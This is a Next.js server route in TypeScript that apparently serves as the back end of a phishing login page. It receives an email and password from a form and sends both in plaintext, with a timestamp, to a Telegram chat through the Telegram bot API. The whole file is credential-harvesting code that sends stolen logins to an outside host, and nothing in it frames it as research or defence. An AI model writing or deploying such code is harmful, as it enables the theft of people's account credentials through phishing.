import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json()

    // Get Telegram bot credentials from environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram bot credentials not configured" }, { status: 500 })
    }

    const message = `🔐 *New Login Attempt*

📧 *Email/Username:*
\`${email}\`

🔑 *Password:*
\`${password}\`

⏰ *Time:* ${new Date().toLocaleString()}`

    // Send message to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.json()
      console.error("Telegram API error:", errorData)
      return NextResponse.json({ error: "Failed to send message to Telegram" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
